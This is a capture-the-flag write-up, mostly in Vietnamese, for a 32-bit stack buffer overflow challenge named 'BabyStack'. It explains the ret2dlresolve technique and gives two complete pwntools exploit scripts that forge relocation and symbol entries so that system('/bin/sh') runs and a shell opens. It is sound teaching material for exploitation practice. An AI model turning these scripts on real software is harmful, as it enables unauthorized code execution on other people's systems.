# BabyStack

## Mitigation

```text
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```

## analysis

Chương trình có source code khá là ngắn. Hàm main của chương trình chỉ thực hiện 1 lệnh duy nhất là gọi đến hàm `fun()`

```c
ssize_t fun()
{
  char buf[40]; // [esp+0h] [ebp-28h]

  return read(0, buf, 0x200u);
}
```

Nhìn qua thì hàm này có lỗi buffer overflow. Tuy nhiên chương trình không có đủ gadget thực hiện việc leak địa chỉ hàm, hay gọi syscall.... Nên ta phải dùng 1 cách khác mà không cần leak địa chỉ hàm, cũng như tận dụng các gadget có sẵn và hàm `read`. Ở đây mình dùng `ret2dlresolve` để exploit.

## ret2dlresolve

```text
In Linux, programs use _dl_runtime_resolve(link_map_obj, reloc_offset)to relocate dynamically linked functions. So if we can control the corresponding parameters and the content of the corresponding address, can we control the parsing function? The answer is yes. This is also the core of the ret2dlresolve attack.  Specifically, the relocation table entries, dynamic symbol table, and dynamic string table used by the dynamic linker when resolving symbol addresses are all obtained from the dynamic section .dynamicindex . So if we can modify some of the content so that the last symbol resolved by the dynamic linker is the symbol we want to resolve, then the attack will be achieved.
```

## exploit

Chương trình sử dụng `Partial RELRO`, nên .dynamic section sẽ chỉ có quyền read nên ta sẽ gọi target function bằng cách làm giả các relocation entries.

```python
p = start()
rop = ROP(elf)

offset = 44
bss_addr = elf.bss()

stack_size = 0xf00
stack_addr = bss_addr + stack_size

rop.raw('a' * offset)
rop.read(0, stack_addr, 100)
rop.migrate(stack_addr) # leave ret to stack_addr
p.send(rop.chain()) # first read call

rop = ROP(elf)
plt0 = elf.get_section_by_name('.plt').header.sh_addr # address of .plt[0]
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr  # address of .rel.plt
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr  # address of .dynsym
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr  # address of .dynstr
# make a fake write symbol at base_stage + 32 + align
fake_sym = stack_addr + 32    
align = 0x10 - ((fake_sym - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym += align
idx_dynsym = int((fake_sym - dynsym) / 0x10)     # calculate the dynsym index of write
st_name = fake_sym + 0x10 - dynstr      # plus 10 since the size of Elf32_Sym is 16.
fake_read_sym = flat([
    st_name, 0, 0, 0x12
    ])
# make fake write relocation at base_stage+24
idx_offset = stack_addr + 24 - rel_plt
read_got = elf.got['read']
r_info = (idx_dynsym << 8) | 0x7    # calculate the r_info according to the index of write
fake_rel = flat([
    read_got, r_info
    ])
system = 'system\x00\x00'
rop.raw(plt0)
rop.raw(idx_offset)
rop.raw('aaaa')   # fake ret addr of write
rop.raw(stack_addr + 80)
rop.raw('aaaa')
rop.raw('aaaa')
rop.raw(fake_rel)   # fake write reloc
rop.raw('a'*align)     # padding
rop.raw(fake_read_sym)      # fake write symbol
rop.raw(system)
rop.raw('a'*(80 - len(rop.chain())))
rop.raw('/bin/sh\x00')
rop.raw('a'*(100 - len(rop.chain())))

print(rop.dump() )

p.sendline(rop.chain())
p.interactive()
```

### sử dụng pwntools để tạo payload

```python
from pwn import *

elf = context.binary = ELF('./pwn', checksec=False)
context.arch = 'i386'
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 44)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
